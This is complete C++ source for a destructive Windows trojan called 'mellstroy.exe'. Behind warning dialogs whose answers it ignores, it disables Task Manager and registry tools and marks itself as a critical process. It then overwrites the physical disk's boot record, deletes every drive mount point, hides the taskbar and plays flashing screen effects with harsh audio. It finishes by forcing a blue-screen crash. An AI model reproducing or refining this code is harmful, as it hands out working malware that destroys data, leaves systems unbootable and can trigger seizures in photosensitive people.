#include <windows.h>
#include <mmsystem.h>
#include <vector>
#include <cmath>
#include <cstdlib>

#pragma comment(lib, "winmm.lib")

#define M_PI 3.14159265358979323846
const int SAMPLE_RATE = 8000;
const int SOUND_DURATION_SEC = 50;
const int TOTAL_SAMPLES = SAMPLE_RATE * SOUND_DURATION_SEC;

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef VOID(NTAPI* RSPICdef)(BOOLEAN, PBOOLEAN, BOOLEAN);

int red, green, blue;
COLORREF Hue(int length) {
    if (red != length) { red++; return RGB(red, 0, 0); }
    else if (green != length) { green++; return RGB(length, green, 0); }
    else if (blue != length) { blue++; return RGB(0, length, blue); }
    else { red = 0; green = 0; blue = 0; return RGB(0, 0, 0); }
}

volatile int activePhase = 0;

typedef struct {
    LPCWSTR text;
    LPCWSTR title;
    UINT type;
} MSGBOX_DATA;

DWORD WINAPI BounceMessageBoxThread(LPVOID lpParam) {
    MSGBOX_DATA* data = (MSGBOX_DATA*)lpParam;
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int x = sw / 3, y = sh / 3;
    int dx = 14, dy = 10;

    Sleep(100);
    HWND hwnd = GetForegroundWindow();

    while (IsWindow(hwnd)) {
        RECT rc;
        GetWindowRect(hwnd, &rc);
        int w = rc.right - rc.left;
        int h = rc.bottom - rc.top;

        x += dx; y += dy;
        if (x <= 0 || x + w >= sw) dx = -dx;
        if (y <= 0 || y + h >= sh) dy = -dy;

        SetWindowPos(hwnd, HWND_TOPMOST, x, y, 0, 0, SWP_NOSIZE | SWP_NOACTIVATE);
        Sleep(16);
    }
    delete data;
    return 0;
}

void SpawnBouncingBox(LPCWSTR text, LPCWSTR title, UINT type) {
    MSGBOX_DATA* data = new MSGBOX_DATA{ text, title, type };
    CreateThread(NULL, 0, BounceMessageBoxThread, data, 0, NULL);
    MessageBoxW(NULL, text, title, type | MB_TOPMOST);
}

DWORD WINAPI GlobalDVDBounceThread(LPVOID lpParam) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int x = sw / 3, y = sh / 3;
    int dx = 14, dy = 10;
    HWND lastHwnd = NULL;

    while (activePhase >= 0) {
        HWND hwnd = GetForegroundWindow();
        if (hwnd != NULL && hwnd != GetDesktopWindow() && hwnd != GetShellWindow()) {
            if (hwnd != lastHwnd) {
                lastHwnd = hwnd;
                RECT rc;
                GetWindowRect(hwnd, &rc);
                x = rc.left;
                y = rc.top;
            }

            RECT rc;
            GetWindowRect(hwnd, &rc);
            int w = rc.right - rc.left;
            int h = rc.bottom - rc.top;

            if (w > 0 && h > 0) {
                x += dx; y += dy;
                if (x <= 0 || x + w >= sw) dx = -dx;
                if (y <= 0 || y + h >= sh) dy = -dy;

                SetWindowPos(hwnd, HWND_TOPMOST, x, y, 0, 0, SWP_NOSIZE | SWP_NOACTIVATE);
            }
        }
        Sleep(16);
    }
    return 0;
}

DWORD WINAPI BouncingWarningIconThread(LPVOID lpParam) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int ix = sw / 2, iy = sh / 2;
    int idx = 11, idy = 8;
    float angle = 0.0f;
    HICON hWarnIcon = LoadIconW(NULL, IDI_WARNING);

    while (activePhase > 0) {
        HDC hdc = GetDC(NULL);
        angle += 10.0f;
        float radians = angle * (3.14159265f / 180.0f);

        ix += idx; iy += idy;
        if (ix <= 50 || ix >= sw - 100) idx = -idx;
        if (iy <= 50 || iy >= sh - 100) idy = -idy;

        SetGraphicsMode(hdc, GM_ADVANCED);
        XFORM xform;
        xform.eM11 = cos(radians);  xform.eM12 = sin(radians);
        xform.eM21 = -sin(radians); xform.eM22 = cos(radians);
        xform.eDx = (float)ix;      xform.eDy = (float)iy;
        SetWorldTransform(hdc, &xform);

        DrawIconEx(hdc, -32, -32, hWarnIcon, 96, 96, 0, NULL, DI_NORMAL);

        XFORM xformIdent = { 1.0f, 0.0f, 0.0f, 1.0f, 0.0f, 0.0f };
        SetWorldTransform(hdc, &xformIdent);
        ReleaseDC(NULL, hdc);
        Sleep(16);
    }
    return 0;
}

DWORD WINAPI PlayBytebeatThread(LPVOID lpParam) {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE, SAMPLE_RATE, 1, 8, 0 };
    std::vector<char> soundBuffer(TOTAL_SAMPLES * 7);

    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) == MMSYSERR_NOERROR) {
        for (DWORD t = 0; t < TOTAL_SAMPLES; t++) {
            long st = static_cast<long>(t);
            soundBuffer[t] = static_cast<char>((st >> ((st >> 12) % 4)) + st * (1 + (1 + (st >> 16) % 6) * (st >> 10) * (st >> 11) % 8) ^ st >> 13 ^ st >> 6);
            soundBuffer[TOTAL_SAMPLES + t] = static_cast<char>(st >> 6 & st * 6 & st >> 7 ^ st >> 4 & st + (st >> 6 & (st * -1)) | st >> 3);
            soundBuffer[TOTAL_SAMPLES * 2 + t] = static_cast<char>(st * (st & st + (st >> 15 | 1) / (st - 1280 ^ st) >> 6));
            soundBuffer[TOTAL_SAMPLES * 3 + t] = static_cast<char>(((~st) >> 2) * ((~st) >> 5) | (~st) >> 5);
            soundBuffer[TOTAL_SAMPLES * 4 + t] = static_cast<char>(st * ((st >> 9 | st >> 13) & 15) & 125);
            soundBuffer[TOTAL_SAMPLES * 5 + t] = static_cast<char>(st * (st & st >> 5));
            soundBuffer[TOTAL_SAMPLES * 6 + t] = static_cast<char>(st * ((st >> 5) | (st >> 4)) >> (st >> 16));
        }

        for (int p = 1; p <= 7; p++) {
            WAVEHDR waveHdr = { soundBuffer.data() + (TOTAL_SAMPLES * (p - 1)), (DWORD)TOTAL_SAMPLES, 0, 0, 0, 0, 0, 0 };
            waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &waveHdr, sizeof(WAVEHDR));
            while (activePhase == p) Sleep(10); waveOutReset(hWaveOut);
        }
        waveOutClose(hWaveOut);
    }
    return 0;
}

DWORD WINAPI mountvoled(LPVOID lpvd) {
    LPCWSTR drives[] = { L"A:\\", L"B:\\", L"C:\\", L"D:\\", L"E:\\", L"F:\\", L"G:\\", L"H:\\", L"I:\\", L"J:\\", L"K:\\", L"L:\\", L"M:\\", L"N:\\", L"O:\\", L"P:\\", L"Q:\\", L"R:\\", L"S:\\", L"T:\\", L"U:\\", L"V:\\", L"W:\\", L"X:\\", L"Y:\\", L"Z:\\" };
    for (int i = 0; i < 26; i++) {
        DeleteVolumeMountPointW(drives[i]);
    }
    return 1;
}

void Draw3DCube(HDC hdc, int x, int y, int size, int depth) {
    HBRUSH brush = CreateSolidBrush(Hue(239));
    HBRUSH oldBrush = (HBRUSH)SelectObject(hdc, brush);
    Rectangle(hdc, x, y, x + size, y + size);
    MoveToEx(hdc, x, y, NULL); LineTo(hdc, x + depth, y - depth);
    LineTo(hdc, x + size + depth, y - depth); LineTo(hdc, x + size, y);
    MoveToEx(hdc, x + size, y, NULL); LineTo(hdc, x + size + depth, y - depth);
    LineTo(hdc, x + size + depth, y + size - depth); LineTo(hdc, x + size, y + size);
    MoveToEx(hdc, x, y, NULL); LineTo(hdc, x + depth, y - depth);
    LineTo(hdc, x + depth, y + size - depth); LineTo(hdc, x, y + size);
    SelectObject(hdc, oldBrush); DeleteObject(brush);
}

void BlockSystemUtility(const char* subKey, const char* valueName, DWORD valueData) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName, 0, REG_DWORD, (const BYTE*)&valueData, sizeof(DWORD));
        RegCloseKey(hKey);
    }
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLine, int nCmdShow) {

    SpawnBouncingBox(L"This is a Malware, Run?", L"mellstroy.exe", MB_YESNO | MB_ICONWARNING);
    SpawnBouncingBox(L"Are you sure? It will overwrite the boot record, corrupt the registry and it contains flashing lights - NOT for epilepsy", L"mellstroy.exe - Last Warning", MB_YESNO | MB_ICONWARNING);

    BlockSystemUtility("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1);
    BlockSystemUtility("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1);
    BlockSystemUtility("Software\\Policies\\Microsoft\\Windows\\MMC", "RestrictToPermittedSnapIns", 1);

    HANDLE hNtdll = LoadLibraryW(L"ntdll.dll");
    if (hNtdll != NULL) {
        BOOLEAN bl;
        RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress((HMODULE)hNtdll, "RtlAdjustPrivilege");
        RSPICdef fSetCritical = (RSPICdef)GetProcAddress((HMODULE)hNtdll, "RtlSetProcessIsCritical");
        if (RtlAdjustPrivilege != NULL && fSetCritical != NULL) {
            RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
            fSetCritical(TRUE, NULL, FALSE);
        }
    }

    unsigned char writeBuffer[512];
    memset(writeBuffer, 0, 512);

    HRSRC hRes = FindResourceA(hInstance, MAKEINTRESOURCEA(101), "BINARY");
    if (hRes != NULL) {
        HGLOBAL hData = LoadResource(hInstance, hRes);
        unsigned char* bootBuffer = (unsigned char*)LockResource(hData);
        DWORD bootSize = SizeofResource(hInstance, hRes);

        if (bootBuffer != NULL && bootSize > 0) {
            DWORD bytesToCopy = (bootSize > 512) ? 512 : bootSize;
            memcpy(writeBuffer, bootBuffer, bytesToCopy);
        }
    }

    if (writeBuffer[510] == 0 && writeBuffer[511] == 0) {
        writeBuffer[510] = 0x55;
        writeBuffer[511] = 0xAA;
    }

    HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        WriteFile(hDisk, writeBuffer, 512, &bytesWritten, NULL);
        CloseHandle(hDisk);
    }

    HWND hTray = FindWindowW(L"Shell_TrayWnd", NULL);
    HWND hStart = FindWindowW(L"Button", NULL);
    if (hTray) ShowWindow(hTray, SW_HIDE);
    if (hStart) ShowWindow(hStart, SW_HIDE);

    SpawnBouncingBox(
        L"Error to start to start applicone, code for stop:(0xC000007b) Please, reinstal the applicone.",
        L"Error the applicone",
        MB_OK | MB_ICONERROR
    );

    Sleep(2000);

    activePhase = 1;
    HANDLE hSoundThread = CreateThread(NULL, 0, PlayBytebeatThread, NULL, 0, NULL);

    CreateThread(NULL, 0, BouncingWarningIconThread, NULL, 0, NULL);
    CreateThread(NULL, 0, GlobalDVDBounceThread, NULL, 0, NULL);
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = sw; bmi.bmiHeader.biHeight = sh;
    bmi.bmiHeader.biPlanes = 1; bmi.bmiHeader.biBitCount = 32; bmi.bmiHeader.biCompression = BI_RGB;
    DWORD* rgbtriple = NULL;
    HDC deskMem = CreateCompatibleDC(hdc);
    HBITMAP scr = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbtriple, NULL, 0);
    SelectObject(deskMem, scr);
    int realCursorX = sw / 2, realCursorY = sh / 2;
    int dvdSpeedX = 13, dvdSpeedY = 9;
    int iTime = 0; float textAngle = 0.0f;
    int cubeX = 40, cubeY = 40, cubeDX = 10, cubeDY = 7;
    int n = 4;
    LPCWSTR systemCursors[] = { (LPCWSTR)IDC_WAIT, (LPCWSTR)IDC_CROSS, (LPCWSTR)IDC_HELP, (LPCWSTR)IDC_NO, (LPCWSTR)IDC_SIZEALL };
    LPCWSTR txts[] = { L"Mellstroy.exe", L"Pangey1" };
    for (int p = 1; p <= 7; p++) {
        activePhase = p;
        DWORD startTime = GetTickCount();
        DWORD phaseDuration = SOUND_DURATION_SEC * 1000;
        while ((GetTickCount() - startTime) < phaseDuration) {
            iTime++;
            realCursorX += dvdSpeedX; realCursorY += dvdSpeedY;
            if (realCursorX <= 0 || realCursorX >= sw) dvdSpeedX = -dvdSpeedX;
            if (realCursorY <= 0 || realCursorY >= sh) dvdSpeedY = -dvdSpeedY;
            SetCursorPos(realCursorX, realCursorY);
            if (p == 1) {
                BitBlt(deskMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
                for (int i = 0; i < sw * sh; i++) {
                    int x = i % sw, y = i / sw;
                    DWORD pix = rgbtriple[i];
                    BYTE g = (BYTE)(((pix >> 8) & 0xFF) + (x ^ y));
                    rgbtriple[i] = (pix & 0xFF00FFFF) | (g << 8);
                }
                BitBlt(hdc, -30, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
                BitBlt(hdc, sw - 30, 0, sw, sh, deskMem, 0, 0, NOTSRCCOPY);
            }
            else if (p == 2) {
                BitBlt(deskMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
                for (int x = 0; x < sw; x += 3) {
                    for (int y = 0; y < sh; y += 3) {
                        int index = y * sw + x;
                        if (index < sw * sh) {
                            int fx = (int)((iTime ^ 4) + (iTime * 4) * log(x * iTime & iTime * y));
                            BYTE r = (BYTE)((fx + x) % 256);
                            BYTE g = (BYTE)((fx + y) % 256);
                            BYTE b = (BYTE)(((rgbtriple[index] & 0xFF) + fx + iTime) % 256);
                            rgbtriple[index] = (r << 16) | (g << 8) | b;
                        }
                    }
                }
                StretchBlt(hdc, 0, 0, sw, sh, deskMem, 0, 0, sw, sh, NOTSRCCOPY);
                DrawIconEx(hdc, rand() % sw, rand() % sh, LoadCursorW(NULL, (LPCWSTR)IDC_HAND), 3 * GetSystemMetrics(SM_CXICON), 3 * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
            }
            else if (p == 3) {
                BitBlt(deskMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
                for (int x = 0; x < sw; x += 2) {
                    for (int y = 0; y < sh; y += 2) {
                        int index = y * sw + x;
                        if (index < sw * sh) {
                            int fx = (x + iTime) ^ (y * iTime);
                            BYTE r = (BYTE)((fx + iTime) % 256);
                            BYTE g = (BYTE)((fx ^ 0xFF) % 256);
                            rgbtriple[index] = (r << 16) | (g << 8) | (rgbtriple[index] & 0xFF);
                        }
                    }
                }
                StretchBlt(hdc, 0, 0, sw, sh, deskMem, 0, 0, sw, sh, SRCCOPY);
                textAngle += 20.0f; float radians = textAngle * (3.14159265f / 180.0f);
                SetGraphicsMode(hdc, GM_ADVANCED); XFORM xform;
                xform.eM11 = cos(radians); xform.eM12 = sin(radians); xform.eM21 = -sin(radians); xform.eM22 = cos(radians);
                xform.eDx = (float)(rand() % sw); xform.eDy = (float)(rand() % sh); SetWorldTransform(hdc, &xform);
                SetBkMode(hdc, TRANSPARENT); SetTextColor(hdc, Hue(239));
                HFONT font = CreateFontA(rand() % 35 + 20, 0, 0, 0, FW_BOLD, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Comic Sans MS");
                HFONT oldFont = (HFONT)SelectObject(hdc, font);
                TextOutA(hdc, 0, 0, "MELLSTROY HAIP", 14);
                SelectObject(hdc, oldFont); DeleteObject(font);
                XFORM xformIdent = { 1.0f, 0.0f, 0.0f, 1.0f, 0.0f, 0.0f }; SetWorldTransform(hdc, &xformIdent);
                BitBlt(hdc, (rand() % 10) - 5, (rand() % 10) - 5, sw, sh, hdc, 0, 0, SRCINVERT);
            }
            else if (p == 4) {
                if (iTime == 1) { CreateThread(NULL, 0, mountvoled, NULL, 0, NULL); }
                int meltX = rand() % sw;
                int meltWidth = rand() % 120 + 30; int meltHeight = rand() % sh;
                BitBlt(hdc, meltX, rand() % 15 + 5, meltWidth, meltHeight, hdc, meltX, meltHeight, SRCCOPY);
            }
            else if (p == 5) {
                HRGN hRgn = CreateEllipticRgn(rand() % sw - 80, rand() % sh - 80, rand() % sw + 80, rand() % sh + 80);
                InvertRgn(hdc, hRgn); DeleteObject(hRgn);
                cubeX += cubeDX; cubeY += cubeDY;
                if (cubeX <= 0 || cubeX >= sw - 120) cubeDX = -cubeDX;
                if (cubeY <= 40 || cubeY >= sh - 120) cubeDY = -cubeDY;
                Draw3DCube(hdc, cubeX, cubeY, 100, 40);
                int hexX = (iTime * 10) % (sw - 100); int hexY = (iTime * 7) % (sh - 100);
                int centerX = hexX + 50; int centerY = hexY + 50; int radius = 50;
                POINT hexagonPoints[6];
                for (int i = 0; i < 6; ++i) {
                    double angle = 2.0 * M_PI * i / 6;
                    hexagonPoints[i].x = centerX + (int)(radius * cos(angle));
                    hexagonPoints[i].y = centerY + (int)(radius * sin(angle));
                }
                HBRUSH brush = CreateHatchBrush(rand() % 7, Hue(239)); HBRUSH oldBrush = (HBRUSH)SelectObject(hdc, brush);
                Polygon(hdc, hexagonPoints, 6); SelectObject(hdc, oldBrush); DeleteObject(brush);
            }
            else if (p == 6) {
                BitBlt(deskMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
                for (int i = 0; i < sw * sh; i++) {
                    int v = 1 + rand() % 13;
                    if (i + v < sw * sh) {
                        BYTE r = (BYTE)(((rgbtriple[i + v] >> 16) & 0xFF) + 5);
                        BYTE g = (BYTE)(((rgbtriple[i + v] >> 8) & 0xFF) + 5);
                        BYTE b = (BYTE)((rgbtriple[i + v] & 0xFF) + 5);
                        rgbtriple[i] = (r << 16) | (g << 8) | b;
                    }
                }
                BitBlt(hdc, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
                SetBkMode(hdc, TRANSPARENT);
                HFONT font = CreateFontA(43, 32, 0, 0, FW_HEAVY, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Engravers MT");
                HFONT oldFont = (HFONT)SelectObject(hdc, font);
                int textIdx = rand() % 2;
                SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
                TextOutW(hdc, rand() % sw, rand() % sh, (LPCWSTR)txts[textIdx], (int)wcslen((LPCWSTR)txts[textIdx])); Sleep(10);
                textIdx = rand() % 2;
                SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
                TextOutW(hdc, rand() % sw, rand() % sh, (LPCWSTR)txts[textIdx], (int)wcslen((LPCWSTR)txts[textIdx])); Sleep(10);
                SelectObject(hdc, oldFont); DeleteObject(font);
            }
            else if (p == 7) {
                BitBlt(deskMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
                POINT wPt[3];
                int c = 10;
                wPt[0].x = rand() % 11 - 5;       wPt[0].y = rand() % 21 - 10;
                wPt[1].x = sw + rand() % 21 - 10; wPt[1].y = rand() % 41 - 20;
                wPt[2].x = c - rand() % 21 - c;   wPt[2].y = sh - c + rand() % 21 - c;
                PlgBlt(hdc, wPt, hdc, 0, 0, sw, sh, NULL, 0, 0);
                StretchBlt(hdc, n, n, sw - n * 2, sh - n * 2, deskMem, 0, 0, sw, sh, SRCCOPY);
                if (n < sw) n += 12;
                if (n > sw) n = 4;
                if (iTime % 15 == 0) {
                    MessageBoxW(NULL, L"CRITICAL ERROR", L"SYSTEM DIE", MB_OK | MB_ICONERROR | MB_NOFOCUS);
                }
                int cx = rand() % sw; int cy = rand() % sh; int sm = (rand() % 5 + 3);
                DrawIconEx(hdc, cx, cy, (HICON)LoadCursorW(NULL, systemCursors[rand() % 5]), sm * GetSystemMetrics(SM_CXICON), sm * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
            }
            Sleep(20);
        }
        Sleep(300); InvalidateRect(NULL, NULL, TRUE); Sleep(100);
    }
    DeleteDC(deskMem); DeleteObject(scr); ReleaseDC(NULL, hdc);
    activePhase = -1;
    if (hSoundThread != NULL) { WaitForSingleObject(hSoundThread, INFINITE); CloseHandle(hSoundThread); }
    // 🔥 ОРИГИНАЛЬНЫЙ СИНИЙ ЭКРАН ИЗ CHROMAWRECKER.EXE (0xC000021A)
    if (hNtdll != NULL) {
        ULONG_PTR uResponse;
        ULONG uRespOut;
        RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress((HMODULE)hNtdll, "RtlAdjustPrivilege");
        NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress((HMODULE)hNtdll, "NtRaiseHardError");
        if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
            BOOLEAN bEnabled;
            RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled); // Включаем привилегию краша
            NtRaiseHardError(0xC000021A, 0, 0, &uResponse, 6, &uRespOut); // Вызываем синий экран смерти!
        }
    }
    Sleep(-1);
    return 0;
}